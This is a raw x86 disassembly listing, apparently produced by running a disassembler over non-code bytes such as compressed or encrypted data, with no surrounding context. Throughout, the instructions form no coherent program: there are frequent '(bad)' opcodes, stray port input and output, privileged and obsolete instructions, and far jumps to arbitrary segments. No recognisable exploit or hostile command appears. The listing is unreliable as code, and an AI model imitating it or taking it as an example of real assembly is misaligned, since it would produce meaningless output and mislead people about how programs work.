  419ed4:	mov    ds:0xde3e9060,eax
  419ed9:	jno    0x419f49
  419edb:	adc    DWORD PTR [eax+0x45],ebx
  419ede:	mov    al,ds:0x5d11fbfb
  419ee3:	in     eax,dx
  419ee4:	test   BYTE PTR [ebx-0x6f632a15],ch
  419eea:	or     ah,BYTE PTR [edi-0x5120dccc]
  419ef0:	std    
  419ef1:	mov    fs,WORD PTR [edi]
  419ef3:	pushf  
  419ef4:	xchg   ebp,esp
  419ef6:	or     al,BYTE PTR [eax+0x394cd465]
  419efc:	in     al,0x64
  419efe:	jb     0x419f0c
  419f00:	je     0x419f19
  419f02:	sbb    DWORD PTR [eax],esp
  419f04:	out    dx,eax
  419f05:	not    BYTE PTR [edi+0x16]
  419f08:	clc    
  419f09:	test   al,0x45
  419f0b:	mov    ah,0x86
  419f0d:	xchg   ecx,eax
  419f0e:	enter  0xcd4c,0x78
  419f12:	dec    ecx
  419f13:	xor    eax,0xad2ff359
  419f18:	jb     0x419f3d
  419f1a:	in     eax,0xb5
  419f1c:	mov    ch,0x23
  419f1e:	inc    ebp
  419f1f:	and    al,0x46
  419f21:	xchg   ecx,eax
  419f22:	retf   0x1080
  419f25:	pop    esp
  419f26:	push   esp
  419f27:	sub    al,0x6c
  419f29:	pop    es
  419f2a:	xchg   ebp,eax
  419f2b:	adc    eax,0x58dd1a78
  419f30:	cld    
  419f31:	mov    edi,0x1b37b454
  419f36:	push   ebp
  419f37:	lods   eax,DWORD PTR ds:[esi]
  419f38:	sti    
  419f39:	ss push edi
  419f3b:	push   edx
  419f3c:	addr16 jmp 0x419fae
  419f3f:	xchg   ebp,eax
  419f40:	repnz cmp DWORD PTR [ebx+0x44],0x35ecb5ac
  419f48:	pushf  
  419f49:	icebp  
  419f4a:	dec    edx
  419f4b:	loope  0x419f46
  419f4d:	push   ebx
  419f4e:	out    dx,al
  419f4f:	and    eax,0x8817f15a
  419f54:	and    esi,DWORD PTR [edi+0x6]
  419f57:	dec    ecx
  419f58:	cmp    bh,ch
  419f5a:	add    ch,BYTE PTR [edx]
  419f5c:	and    al,0x59
  419f5e:	push   cs
  419f5f:	mov    ah,0x34
  419f61:	push   ecx
  419f62:	and    ah,BYTE PTR [eax+0x33]
  419f65:	int    0x7e
  419f67:	sahf   
  419f68:	xchg   bh,dh
  419f6a:	imul   esi
  419f6c:	cmp    edx,DWORD PTR [ebp-0x38]
  419f6f:	jl     0x419fdb
  419f71:	out    dx,eax
  419f72:	cmp    al,bl
  419f74:	in     al,dx
  419f75:	div    bl
  419f77:	push   0xab309c3
  419f7c:	inc    ebp
  419f7d:	into   
  419f7e:	mov    bl,0xcf
  419f80:	lods   eax,DWORD PTR ds:[esi]
  419f81:	mov    ecx,0x2fba7517
  419f86:	mov    dl,0x44
  419f88:	retf   0xef88
  419f8b:	(bad)  
  419f8c:	xchg   edi,eax
  419f8d:	cs clc 
  419f8f:	fstp   QWORD PTR [eax]
  419f91:	call   0xd70db4e8
  419f96:	dec    ebx
  419f97:	push   esp
  419f98:	jnp    0x419f21
  419f9a:	or     eax,0xbe2d73d3
  419f9f:	arpl   WORD PTR [edi+ebp*8],bp
  419fa2:	cli    
  419fa3:	ret    0x955
  419fa6:	inc    edx
  419fa7:	not    DWORD PTR [ecx+0x603bb39c]
  419fad:	and    DWORD PTR [eax-0x7e120622],ecx
  419fb3:	jl     0x419f41
  419fb5:	mov    bh,0xbc
  419fb7:	pop    esi
  419fb8:	imul   DWORD PTR [ebx-0xf]
  419fbb:	enter  0xd94c,0x95
  419fbf:	sub    DWORD PTR [eax-0x4],ebp
  419fc2:	xchg   BYTE PTR [esi+esi*1-0xc],ch
  419fc6:	stos   BYTE PTR es:[edi],al
  419fc7:	sbb    eax,0xc97090a5
  419fcc:	jp     0x41a002
  419fce:	lea    esi,ds:0xecc971cb
  419fd4:	aad    0xb2
  419fd6:	out    0xfe,al
  419fd8:	jae    0x419fe2
  419fda:	fst    DWORD PTR [edi]
  419fdc:	adc    ebp,edi
  419fde:	mov    ah,0xed
  419fe0:	shl    BYTE PTR [ebx-0x1d],cl
  419fe3:	mov    DWORD PTR [edi-0x44],ebp
  419fe6:	cld    
  419fe7:	adc    al,0x99
  419fe9:	ror    DWORD PTR [ebp-0x46],1
  419fec:	mov    ebx,0x78b3b2c2
  419ff1:	mov    esi,0x8fa4fe81
  419ff6:	sti    
  419ff7:	jp     0x41a021
  419ff9:	adc    dh,dh
  419ffb:	push   edx
  419ffc:	ret    0x3d78
  419fff:	pop    esi
  41a000:	sbb    ah,BYTE PTR [ecx-0x3e]
  41a003:	cvtps2pi mm1,QWORD PTR [ebp-0x7]
  41a007:	push   esi
  41a008:	cmc    
  41a009:	mov    ds:0xf001a4a0,eax
  41a00e:	pop    edx
  41a00f:	bound  ebp,QWORD PTR [edx+0x244abaf2]
  41a015:	scas   al,BYTE PTR es:[edi]
  41a016:	lock scas al,BYTE PTR es:[edi]
  41a018:	fistp  DWORD PTR [ecx+0x67]
  41a01b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a01c:	imul   esi,DWORD PTR [esp+0x2f],0xffffffde
  41a021:	xchg   ebp,eax
  41a022:	pop    es
  41a023:	pop    ds
  41a024:	xchg   edx,eax
  41a025:	mov    eax,ds:0x307ad488
  41a02a:	pop    ebp
  41a02b:	pushf  
  41a02c:	repz out dx,al
  41a02e:	mov    edi,0x67082253
  41a033:	cmp    eax,0x9ecd8d74
  41a038:	cmp    al,0xbb
  41a03a:	aas    
  41a03b:	gs push esi
  41a03d:	jecxz  0x419fc1
  41a03f:	fldcw  WORD PTR [edi+0x2f5fcc55]
  41a045:	ret    
  41a046:	jb     0x419fca
  41a048:	mov    esp,0x2c89ac7e
  41a04d:	mov    esi,0x46e68e89
  41a052:	jp     0x41a055
  41a054:	xchg   dl,ah
  41a056:	cmp    DWORD PTR [ebx],edi
  41a058:	sub    BYTE PTR [ebp+0x4f92ef29],ah
  41a05e:	sub    dl,BYTE PTR [eax]
  41a060:	ret    
  41a061:	sub    eax,0x41d907a6
  41a066:	dec    esp
  41a067:	fdivr  DWORD PTR [ebp+0x21]
  41a06a:	push   edi
  41a06b:	repnz sbb dh,bl
  41a06e:	sahf   
  41a06f:	leave  
  41a070:	cmp    DWORD PTR ds:0xae82b665,0x6f
  41a077:	sbb    BYTE PTR [eax],cl
  41a079:	push   ebp
  41a07a:	jmp    0xa1dd:0x556d519e
  41a081:	jb     0x41a0a6
  41a083:	push   edi
  41a084:	and    BYTE PTR [edi+0xc],dh
  41a087:	retf   
  41a088:	jae    0x41a098
  41a08a:	sahf   
  41a08b:	jmp    0x559141df
  41a090:	dec    ebx
  41a091:	retf   0x7276
  41a094:	mov    eax,ds:0xceb9972b
  41a099:	(bad)  
  41a09a:	push   ecx
  41a09c:	jae    0x41a0a8
  41a09e:	xchg   esi,eax
  41a09f:	test   DWORD PTR [ecx-0x10b35905],edx
  41a0a5:	lods   al,BYTE PTR ds:[esi]
  41a0a6:	loopne 0x41a0b2
  41a0a8:	es push cs
  41a0aa:	and    eax,0x2d5b62b6
  41a0af:	(bad)  
  41a0b0:	shl    BYTE PTR [edi+0xb],1
  41a0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b4:	push   ebp
  41a0b5:	add    eax,0x4627237e
  41a0ba:	test   DWORD PTR [ecx+0x14],ecx
  41a0bd:	push   esi
  41a0be:	sbb    al,0xf6
  41a0c0:	mov    edx,0x6db0ab74
  41a0c5:	cs push ds
  41a0c7:	push   ss
  41a0c8:	enter  0x27c8,0x53
  41a0cc:	inc    ebx
  41a0cd:	ja     0x41a0ac
  41a0cf:	mov    ah,0x30
  41a0d1:	into   
  41a0d2:	sbb    ecx,DWORD PTR [esi-0x31b66ee6]
  41a0d8:	and    ah,BYTE PTR [edx+0x6710a525]
  41a0de:	ret    
  41a0df:	fdivr  DWORD PTR [ebp+0x2e566e3e]
  41a0e5:	jo     0x41a15f
  41a0e7:	inc    ecx
  41a0e8:	inc    esi
  41a0e9:	(bad)  
  41a0ea:	cli    
  41a0eb:	cmp    ebp,edx
  41a0ed:	sub    ebx,edi
  41a0ef:	xchg   DWORD PTR [ebx+0x79],edi
  41a0f2:	aaa    
  41a0f3:	btc    ebx,esp
  41a0f6:	add    BYTE PTR [ebx],dl
  41a0f8:	popa   
  41a0f9:	or     dh,BYTE PTR [edx+0x7]
  41a0fc:	sti    
  41a0fd:	jl     0x41a115
  41a0ff:	and    eax,0xb63615c3
  41a104:	mov    edi,0xc6c87be7
  41a109:	adc    al,0x4e
  41a10b:	mov    dx,0xd3f2
  41a10f:	clc    
  41a110:	and    ebx,edx
  41a112:	popa   
  41a113:	retf   
  41a114:	aam    0xcb
  41a116:	iret   
  41a117:	stos   BYTE PTR es:[edi],al
  41a118:	aaa    
  41a119:	jg     0x41a17a
  41a11b:	xor    eax,0xaaff8970
  41a120:	js     0x41a106
  41a122:	into   
  41a123:	inc    eax
  41a124:	ja     0x41a0b0
  41a126:	adc    BYTE PTR [edx+0x1627abb],al
  41a12c:	xchg   ecx,eax
  41a12d:	and    cl,BYTE PTR [eax]
  41a12f:	push   di
  41a131:	pushf  
  41a132:	sahf   
  41a133:	stc    
  41a134:	push   0xe6ffc380
  41a139:	xor    eax,0x19291353
  41a13e:	mov    esp,0xd63ddce6
  41a143:	dec    edi
  41a144:	test   BYTE PTR [edi-0x7f5e2ac],0x85
  41a14b:	xchg   esi,eax
  41a14c:	data16 fisub WORD PTR [esi]
  41a14f:	jmp    0x2681:0x53e11782
  41a156:	sub    eax,0xff5cd1b8
  41a15b:	push   0x7c4415a6
  41a160:	push   ebx
  41a161:	cmp    al,0xe7
  41a163:	mov    edx,DWORD PTR [edi+0x1136485b]
  41a169:	mov    bl,BYTE PTR ds:0x8b24ad7c
  41a16f:	cli    
  41a170:	rcl    edi,cl
  41a172:	ja     0x41a1b7
  41a174:	(bad)  
  41a175:	sahf   
  41a176:	mov    ecx,0xdbe07974
  41a17b:	and    cl,BYTE PTR [ecx+0x27]
  41a17e:	fld    DWORD PTR [edi+0xd9df7d]
  41a184:	into   
  41a185:	pop    esi
  41a186:	sbb    esp,DWORD PTR [esi]
  41a188:	adc    bh,BYTE PTR [ebx+0x2787bd4a]
  41a18e:	fiadd  DWORD PTR [ebx]
  41a190:	add    eax,0x8143db66
  41a195:	pminsw mm2,QWORD PTR [edi-0x666d38a3]
  41a19c:	sub    eax,0x5fb2d8a
  41a1a1:	inc    esp
  41a1a2:	pop    ebx
  41a1a3:	(bad)  
  41a1a4:	fist   DWORD PTR fs:[ebp-0x299df102]
  41a1ab:	ins    DWORD PTR es:[edi],dx
  41a1ac:	cmp    ch,BYTE PTR [ecx+esi*1]
  41a1af:	xchg   edx,eax
  41a1b0:	and    edx,DWORD PTR [edi+0xd7c29a9]
  41a1b6:	in     eax,dx
  41a1b7:	retf   
  41a1b8:	test   al,0x9a
  41a1ba:	jle    0x41a21d
  41a1bc:	lea    edx,[eax+ecx*4]
  41a1bf:	and    al,0x37
  41a1c1:	imul   BYTE PTR [ecx+0x3057bee5]
  41a1c7:	lahf   
  41a1c8:	push   edi
  41a1c9:	das    
  41a1ca:	js     0x41a1f7
  41a1cc:	imul   edx,DWORD PTR [ebx],0xf93d53ee
  41a1d2:	sub    eax,0x3572c891
  41a1d7:	sbb    BYTE PTR [edi+0x5b],0x80
  41a1db:	loop   0x41a1d9
  41a1dd:	ins    BYTE PTR es:[edi],dx
  41a1de:	xchg   BYTE PTR [edi],bh
  41a1e0:	pop    esi
  41a1e1:	jmp    0x41a1ab
  41a1e3:	cs nop
  41a1e5:	repnz jmp 0x127d:0x58f4ed85
  41a1ed:	xchg   ecx,eax
  41a1ee:	cmp    BYTE PTR [edx+0x44],0x63
  41a1f2:	mov    al,0x8b
  41a1f4:	out    dx,eax
  41a1f5:	lods   eax,DWORD PTR ds:[esi]
  41a1f6:	jl     0x41a20c
  41a1f8:	mov    al,ds:0x71bb7981
  41a1fd:	cmp    edi,DWORD PTR [ebx+ebx*2+0x47ec42a5]
  41a204:	add    eax,0x7713e4ba
  41a209:	mov    esp,0xe8f62370
  41a20e:	add    ebp,esi
  41a210:	or     eax,0x691673a6
  41a215:	mov    al,0x12
  41a217:	mov    bh,BYTE PTR [edi+0x3196acbc]
  41a21d:	test   BYTE PTR [eax],0x93
  41a220:	add    al,0xf7
  41a222:	push   eax
  41a223:	mov    dh,0xd0
  41a225:	xor    ebx,ebp
  41a227:	test   BYTE PTR [ecx+0x18c02cfd],0x7e
  41a22e:	sbb    ecx,0x7c74b932
  41a234:	outs   dx,DWORD PTR ss:[esi]
  41a236:	adc    esi,DWORD PTR [ebx+0x577c1e07]
  41a23c:	aaa    
  41a23d:	add    dh,BYTE PTR [esi-0x217e1ae1]
  41a243:	popf   
  41a244:	sub    BYTE PTR [edx-0x190dae1a],cl
  41a24a:	xlat   BYTE PTR ds:[ebx]
  41a24b:	fnstenv [edi]
  41a24d:	and    dh,BYTE PTR [ebp+0x5e24914]
  41a253:	hlt    
  41a254:	lods   eax,DWORD PTR ds:[esi]
  41a255:	jnp    0x41a1d8
  41a257:	push   ds
  41a258:	cmp    BYTE PTR [esi],cl
  41a25a:	or     bh,BYTE PTR [ecx+0x32]
  41a25d:	dec    ebx
  41a25e:	stos   DWORD PTR es:[edi],eax
  41a25f:	sbb    bl,BYTE PTR [ebp+0x4e]
  41a262:	mov    ah,0x16
  41a264:	cmp    ebp,DWORD PTR [esi+0x6e]
  41a267:	jle    0x41a24f
  41a269:	or     ch,cl
  41a26b:	jg     0x41a2a2
  41a26d:	icebp  
  41a26e:	lock push es
  41a270:	add    BYTE PTR [eax-0x66373679],bl
  41a276:	dec    eax
  41a277:	popa   
  41a278:	repnz pop edi
  41a27a:	inc    esi
  41a27b:	xchg   ebx,eax
  41a27c:	imul   eax,DWORD PTR ds:[edx],0x17df5ba8
  41a283:	ffreep st(2)
  41a285:	shl    DWORD PTR [ebx-0x55],1
  41a288:	and    BYTE PTR [eax],bl
  41a28a:	ins    DWORD PTR es:[edi],dx
  41a28b:	clc    
  41a28c:	scas   eax,DWORD PTR es:[edi]
  41a28d:	call   0xc540:0xfeb2f878
  41a294:	adc    dl,al
  41a296:	xchg   ebx,eax
  41a297:	out    0x80,al
  41a299:	cwde   
  41a29a:	sti    
  41a29b:	ror    BYTE PTR [edx-0x55b46a0b],1
  41a2a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2a2:	mov    ah,0x8
  41a2a4:	in     al,0x62
  41a2a6:	ja     0x41a24f
  41a2a8:	gs dec ecx
  41a2aa:	pop    esi
  41a2ab:	ret    0xb524
  41a2ae:	adc    al,0xd5
  41a2b0:	pushf  
  41a2b1:	pop    esp
  41a2b2:	inc    eax
  41a2b3:	inc    edx
  41a2b4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41a2b6:	pop    edi
  41a2b7:	rcl    edx,1
  41a2b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2ba:	pop    ebp
  41a2bb:	fild   DWORD PTR [ebx]
  41a2bd:	in     al,dx
  41a2be:	imul   esi,DWORD PTR [ecx+ebx*2+0x6e36c4a5],0x79
  41a2c6:	and    al,0x93
  41a2c8:	and    BYTE PTR [edi],cl
  41a2ca:	mov    ch,0xf2
  41a2cc:	not    esi
  41a2ce:	leave  
  41a2cf:	cwde   
  41a2d0:	(bad)  
  41a2d1:	mov    bl,0x2b
  41a2d3:	aaa    
  41a2d4:	mov    ebp,0xefd70707
  41a2d9:	shr    BYTE PTR [ebp+0x5d],1
  41a2dc:	or     BYTE PTR [ecx+ecx*8+0x4],dl
  41a2e0:	and    esp,DWORD PTR [edi-0x376612fe]
  41a2e6:	(bad)  
  41a2e7:	xlat   BYTE PTR ds:[ebx]
  41a2e8:	hlt    
  41a2e9:	xchg   edi,eax
  41a2ea:	hlt    
  41a2eb:	mov    eax,0x21ca8e0
  41a2f0:	or     al,0x3a
  41a2f2:	jo     0x41a324
  41a2f4:	sbb    eax,0x3212c0dc
  41a2f9:	shr    DWORD PTR [ebp-0x308f0f2f],cl
  41a2ff:	jae    0x41a31d
  41a301:	gs pop ebp
  41a303:	push   ebp
  41a304:	data16 sar ah,0xda
  41a308:	xor    eax,0x6a1781c5
  41a30d:	out    dx,eax
  41a30e:	dec    ebx
  41a30f:	sar    DWORD PTR [eax-0x701cb2d9],1
  41a315:	inc    eax
  41a316:	repnz push ebp
  41a318:	push   0x50
  41a31a:	cli    
  41a31b:	and    dl,dh
  41a31d:	xchg   edx,eax
  41a31e:	push   es
  41a31f:	mov    ebx,0x4477a0fa
  41a324:	add    ch,BYTE PTR [ebx-0x9c30594]
  41a32a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a32b:	ja     0x41a3a4
  41a32d:	dec    ebx
  41a32e:	and    ebx,esp
  41a330:	loop   0x41a321
  41a332:	out    dx,al
  41a333:	pop    ds
  41a334:	lahf   
  41a335:	outs   dx,BYTE PTR ds:[esi]
  41a336:	retf   
  41a337:	dec    ebp
  41a338:	jae    0x41a36d
  41a33a:	mov    edx,0x75867f9a
  41a33f:	(bad)  
  41a341:	xor    eax,0x2743f206
  41a346:	sub    al,0x98
  41a348:	push   esp
  41a349:	jae    0x41a372
  41a34b:	ins    DWORD PTR es:[edi],dx
  41a34c:	in     eax,0xaf
  41a34e:	arpl   WORD PTR [ebp+0x793933f0],di
  41a354:	sub    BYTE PTR [esi+0x5f],bh
  41a357:	lods   al,BYTE PTR ds:[esi]
  41a358:	inc    eax
  41a359:	push   ebp
  41a35a:	mov    al,ds:0xd5a3a72e
  41a35f:	dec    ebp
  41a360:	enter  0xdb14,0x1d
  41a364:	lahf   
  41a365:	in     eax,0x91
  41a367:	xchg   ebx,eax
  41a368:	pop    edi
  41a369:	test   esp,ebx
  41a36b:	addr16 es pop ss
  41a36e:	adc    al,0x2b
  41a370:	xchg   edi,eax
  41a371:	rcl    BYTE PTR [eax],0x70
  41a374:	fbstp  TBYTE PTR [esi+0xcbf6c69]
  41a37a:	pop    eax
  41a37b:	icebp  
  41a37c:	jp     0x41a347
  41a37e:	sbb    eax,edi
  41a380:	ja     0x41a31a
  41a382:	and    ebp,ebx
  41a384:	shl    DWORD PTR [esi+eax*1+0x40],cl
  41a388:	mov    ?,WORD PTR [esi+0x24]
  41a38b:	js     0x41a3dc
  41a38d:	sub    al,BYTE PTR [edx+esi*8+0x2debe7fd]
  41a394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a395:	dec    eax
  41a396:	ret    0x4cb3
  41a399:	fs fucom st(5)
  41a39c:	xchg   ebp,eax
  41a39d:	xor    bl,BYTE PTR [ecx]
  41a39f:	sbb    eax,0x4cd759a2
  41a3a4:	adc    DWORD PTR ds:0xe5d3cd1a,ebx
  41a3aa:	js     0x41a383
  41a3ac:	test   DWORD PTR [edx],0xe4e1e600
  41a3b2:	cmc    
  41a3b3:	lock push ebx
  41a3b5:	mov    dh,0x4b
  41a3b7:	ss ret 
  41a3b9:	sbb    DWORD PTR ds:0x37145de7,edx
  41a3bf:	inc    edi
  41a3c0:	add    eax,0x60c649b1
  41a3c5:	mov    dh,0x13
  41a3c7:	stc    
  41a3c8:	stc    
  41a3c9:	cmp    al,0x0
  41a3cb:	or     al,0x5d
  41a3cd:	xchg   edi,eax
  41a3ce:	pop    esi
  41a3cf:	push   eax
  41a3d0:	mov    BYTE PTR [eax+0x39912cbf],bh
  41a3d6:	push   edi
  41a3d7:	dec    ebx
  41a3d8:	int3   
  41a3d9:	and    al,0xf5
  41a3db:	and    DWORD PTR [ecx],0xffffffe6
  41a3de:	stc    
  41a3df:	jg     0x41a3df
  41a3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3e2:	lods   eax,DWORD PTR ds:[esi]
  41a3e3:	adc    dh,BYTE PTR [eax-0x2a]
  41a3e6:	add    edi,eax
  41a3e8:	fadd   QWORD PTR [esi+0x63f52070]
  41a3ee:	mov    bh,0x38
  41a3f0:	push   cs
  41a3f1:	cmp    BYTE PTR [eax+0xaa02718],al
  41a3f7:	sbb    dl,BYTE PTR [ecx-0x3cc2db5f]
  41a3fd:	push   ebp
  41a3fe:	dec    DWORD PTR [ecx+0x32]
  41a401:	enter  0xb7bf,0x69
  41a405:	aas    
  41a406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a407:	jnp    0x41a41f
  41a409:	mov    ah,BYTE PTR [eax-0x44780af2]
  41a40f:	jg     0x41a3ba
  41a411:	cli    
  41a412:	fsubr  DWORD PTR [edi+0x2effcd53]
  41a418:	dec    ecx
  41a419:	out    0x6f,al
  41a41b:	push   esp
  41a41c:	add    eax,0x5967709e
  41a421:	inc    ebx
  41a422:	(bad)  [ecx]
  41a424:	mov    ds:0x9a1c552d,eax
  41a429:	cmp    al,0x2c
  41a42b:	test   BYTE PTR [eax+0x7a4accf1],0xd3
  41a432:	mov    ebx,0x9e12dcd6
  41a437:	mov    DWORD PTR [esi-0x49321910],ebp
  41a43d:	bound  edx,QWORD PTR [eax]
  41a43f:	ss aas 
  41a441:	mov    al,ds:0x61441c82
  41a446:	(bad)  
  41a447:	dec    eax
  41a448:	mov    bl,0x8b
  41a44a:	test   BYTE PTR [esi],cl
  41a44c:	mov    esi,0xbcbca1
  41a451:	imul   edx,esi,0x39
  41a454:	cmp    edx,edi
  41a456:	mov    ebx,0xa4a4b6b6
  41a45b:	jecxz  0x41a4ac
  41a45d:	xor    cl,bl
  41a45f:	jns    0x41a449
  41a461:	into   
  41a462:	enter  0x29a4,0xc3
  41a466:	in     al,0xe3
  41a468:	leave  
  41a469:	imul   ebp,DWORD PTR [edx-0xaeda222],0x39a646f5
  41a473:	or     bh,BYTE PTR [edi-0x4f8cca1d]
  41a479:	jle    0x41a401
  41a47b:	lds    ebx,FWORD PTR [ecx]
  41a47d:	popf   
  41a47e:	push   0x6
  41a480:	xchg   esp,eax
  41a481:	imul   esp,DWORD PTR [esi],0x9e70d8f3
  41a487:	nop
  41a488:	inc    esp
  41a489:	outs   dx,DWORD PTR ds:[esi]
  41a48a:	jns    0x41a4da
  41a48c:	cli    
  41a48d:	adc    bh,BYTE PTR [ebx+0x20]
  41a490:	fcomp  DWORD PTR [ebx-0x2f]
  41a493:	(bad)  
  41a495:	mov    bl,dl
  41a497:	clc    
  41a498:	mov    esi,edi
  41a49a:	inc    ecx
  41a49b:	mov    ecx,0xb7a9f3c2
  41a4a0:	add    dl,0xc5
  41a4a3:	mov    eax,ds:0xfb647437
  41a4a8:	push   esi
  41a4a9:	and    dl,BYTE PTR [edx]
  41a4ab:	repz cmp ebp,edx
  41a4ae:	in     al,dx
  41a4af:	add    al,0xf7
  41a4b1:	sbb    DWORD PTR [ebp+0x58],0x74
  41a4b5:	popf   
  41a4b6:	mov    edx,0xd6b23f18
  41a4bb:	mov    ds:0x5705bdf4,al
  41a4c0:	pop    ds
  41a4c1:	arpl   di,ax
  41a4c3:	mov    eax,0xa3d9075b
  41a4c8:	push   edx
  41a4c9:	add    al,0xeb
  41a4cb:	adc    DWORD PTR [edx+0x70],ebx
  41a4ce:	sub    BYTE PTR [ecx-0x37],al
  41a4d1:	sbb    ecx,DWORD PTR [esi-0x349f5398]
  41a4d7:	jo     0x41a498
  41a4d9:	xchg   edx,eax
  41a4da:	sbb    esi,DWORD PTR ds:0xe26910a8
  41a4e0:	add    al,0x9f
  41a4e2:	fmul   st(4),st
  41a4e4:	in     al,0x58
  41a4e6:	jno    0x41a4a1
  41a4e8:	mov    eax,ds:0xda272787
  41a4ed:	in     eax,dx
  41a4ee:	test   eax,0xfe671bd0
  41a4f3:	stos   BYTE PTR es:[edi],al
  41a4f4:	cmp    al,0x6b
  41a4f6:	jle    0x41a4d3
  41a4f8:	mov    ebx,0xeabfc553
  41a4fd:	mov    bl,BYTE PTR [esi]
  41a4ff:	js     0x41a4cc
  41a501:	inc    edx
  41a502:	jne    0x41a553
  41a504:	or     al,0x52
  41a506:	cmc    
  41a507:	scas   al,BYTE PTR es:[edi]
  41a508:	pop    edx
  41a509:	nop
  41a50a:	push   edi
  41a50b:	dec    ecx
  41a50c:	aam    0xfd
  41a50e:	test   al,0xc7
  41a510:	iret   
  41a511:	ins    DWORD PTR es:[edi],dx
  41a512:	cmp    ebx,DWORD PTR [esp+ebp*4]
  41a515:	addr16 push esi
  41a517:	scas   eax,DWORD PTR es:[edi]
  41a518:	jno    0x41a4c7
  41a51a:	sbb    ecx,DWORD PTR [ebx-0x68]
  41a51d:	xor    eax,edi
  41a51f:	mov    esi,0x252f0919
  41a524:	adc    DWORD PTR [eax-0x1189f904],ebx
  41a52a:	cmp    esp,ecx
  41a52c:	aam    0xda
  41a52e:	xor    DWORD PTR [edx],ebx
  41a530:	mov    ecx,0x815cb47
  41a535:	mov    ecx,0x40d946b4
  41a53a:	dec    ebp
  41a53b:	sub    DWORD PTR [edx+0x4a],ecx
  41a53e:	sbb    eax,0xf10a5b96
  41a543:	mov    ebx,0xee90ad29
  41a548:	ds or  eax,0xeb44361d
  41a54e:	sub    DWORD PTR [esi-0x337f328c],0xffffff9a
  41a555:	mov    ds:0xa506136d,al
  41a55a:	test   eax,0x5da898f3
  41a55f:	out    0xe5,eax
  41a561:	std    
  41a562:	shr    DWORD PTR [esi],cl
  41a564:	inc    ebp
  41a565:	sbb    BYTE PTR [eax-0x51],ah
  41a568:	sbb    dl,BYTE PTR [edi]
  41a56a:	scas   eax,DWORD PTR es:[edi]
  41a56b:	ror    DWORD PTR [ebx-0x1b],1
  41a56e:	pop    ecx
  41a56f:	out    dx,al
  41a570:	push   edx
  41a571:	ds xchg bp,ax
  41a574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a575:	adc    BYTE PTR [esi-0x62],al
  41a578:	mov    al,0x87
  41a57a:	jbe    0x41a537
  41a57c:	xchg   ebp,eax
  41a57d:	pop    esi
  41a57e:	test   DWORD PTR [ebp-0x54afc86a],ecx
  41a584:	push   0x36
  41a586:	cmp    eax,0x6d5cc820
  41a58b:	pop    ss
  41a58c:	mov    ebp,0xb4ad898d
  41a591:	mov    al,ds:0xb6d99024
  41a596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a597:	js     0x41a564
  41a599:	cli    
  41a59a:	loopne 0x41a5d0
  41a59c:	sbb    DWORD PTR [ecx-0x20],0x42
  41a5a0:	outs   dx,DWORD PTR ds:[esi]
  41a5a1:	aam    0x65
  41a5a3:	mov    al,ds:0x71a70223
  41a5a8:	cdq    
  41a5a9:	mov    esi,DWORD PTR [edx-0x89796b1]
  41a5af:	xchg   esi,eax
  41a5b0:	xchg   BYTE PTR [edx],cl
  41a5b2:	fist   DWORD PTR [ecx+ecx*1+0x5a]
  41a5b6:	inc    edx
  41a5b7:	sti    
  41a5b8:	rcr    DWORD PTR [ebx-0x25],0xd0
  41a5bc:	icebp  
  41a5bd:	or     eax,0xe855aa2b
  41a5c2:	cs repnz pusha 
  41a5c5:	pop    ecx
  41a5c6:	pop    ecx
  41a5c7:	mov    esp,0x69e60b94
  41a5cc:	xchg   esp,eax
  41a5cd:	nop
  41a5ce:	sub    DWORD PTR [eax+0x12b7cf25],edi
  41a5d4:	pop    ebp
  41a5d5:	push   ds
  41a5d6:	stc    
  41a5d7:	nop
  41a5d8:	jecxz  0x41a561
  41a5da:	imul   ebx,ecx,0x75
  41a5dd:	inc    eax
  41a5de:	imul   DWORD PTR [ebx+0x3e]
  41a5e1:	cdq    
  41a5e2:	rcl    DWORD PTR [edi+0x7a4b6486],cl
  41a5e8:	aam    0xa3
  41a5ea:	out    dx,al
  41a5eb:	test   al,0xf4
  41a5ed:	cmp    al,0x37
  41a5ef:	jg     0x41a65e
  41a5f1:	outs   dx,DWORD PTR ds:[esi]
  41a5f2:	pop    ds
  41a5f3:	call   0xab445363
  41a5f8:	push   es
  41a5f9:	rcl    BYTE PTR [ebx+0x52],1
  41a5fc:	inc    ebx
  41a5fd:	dec    ebp
  41a5fe:	sub    DWORD PTR [ebx+eiz*8+0x7e],esi
  41a602:	int3   
  41a603:	lahf   
  41a604:	mov    eax,0xdb6135a4
  41a609:	std    
  41a60a:	call   0x4a3a1899
  41a60f:	jae    0x41a5b2
  41a611:	pop    ebp
  41a612:	fsub   QWORD PTR [edi]
  41a614:	mov    edi,0x8c86f2c6
  41a619:	push   eax
  41a61a:	jp     0x41a643
  41a61c:	inc    edx
  41a61d:	rcr    BYTE PTR [esi+0x6e5dd9f5],1
  41a623:	fist   DWORD PTR cs:[esi-0x1c2f0ce5]
  41a62a:	daa    
  41a62b:	ds into 
  41a62d:	fwait
  41a62e:	push   ss
  41a62f:	inc    edx
  41a630:	cmp    dl,BYTE PTR [eax-0x56]
  41a633:	ret    
  41a634:	jns    0x41a5e8
  41a636:	dec    eax
  41a637:	pop    esp
  41a638:	dec    ecx
  41a639:	daa    
  41a63a:	xchg   esi,eax
  41a63b:	mov    dh,0xc6
  41a63d:	sub    eax,0xdcab90bb
  41a642:	mov    al,ds:0x17021a3c
  41a647:	stos   BYTE PTR es:[edi],al
  41a648:	jecxz  0x41a5e5
  41a64a:	inc    ebx
  41a64b:	enter  0xa047,0xc8
  41a64f:	outs   dx,BYTE PTR ds:[esi]
  41a650:	ds xchg ebp,eax
  41a652:	mov    dl,0xb7
  41a654:	lods   eax,DWORD PTR ds:[esi]
  41a655:	icebp  
  41a656:	out    dx,eax
  41a657:	sahf   
  41a658:	add    BYTE PTR [ecx+ebp*1],dh
  41a65b:	pop    esi
  41a65c:	pop    esp
  41a65d:	or     ah,BYTE PTR [edi+ebp*2+0x502d76d1]
  41a664:	push   ebx
